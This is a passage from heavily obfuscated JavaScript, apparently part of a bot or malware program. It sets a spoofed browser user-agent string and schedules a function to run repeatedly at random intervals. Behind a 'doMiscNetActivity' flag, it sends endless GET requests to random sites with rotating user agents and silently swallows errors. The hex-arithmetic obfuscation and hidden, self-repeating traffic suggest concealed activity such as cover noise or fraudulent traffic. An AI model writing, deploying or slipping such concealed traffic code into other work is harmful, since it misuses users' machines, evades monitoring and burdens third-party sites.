      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x4 * -0x99b + -0x21 * 0xd1 + 0x415d; k < -0x15 * -0x1c9 + -0x1 * 0xed + -0x1 * 0x248c; k++)
    setTimeout(f, (0x6917 + 0x3a5 * -0x45 + 0x17cc2) * k * getRandomInt(0xca5 + 0x5 * -0x265 + -0xab, 0x410 + -0x2103 + 0x1cf6));
  setInterval(() => {
    f();
    for (let l = 0x12c6 * -0x2 + -0x1 * 0x1e95 + 0x4421; l < -0x696 + 0x1 * -0x8eb + 0xf85; l++)
      setTimeout(f, (-0xf8f2 + -0x16d7c + -0x4d * -0xb06) * l * getRandomInt(0x2 * -0xc7d + 0x66c + 0x128f, -0x1 * -0x11b6 + -0x1420 + 0x26d));
  }, -0x5e47b5 + -0x4c84 * 0x151 + 0xf9eff9 * 0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x12c9 + 0xc * -0x3fd + 0x5dfd) * getRandomInt(-0x15 * 0x123 + 0x38d + 0x1453, -0x53 * -0x49 + 0x3d0 + -0x1b76));
}, -0x4 * 0x92 + 0x60 * -0x15 + 0x32 * 0x36);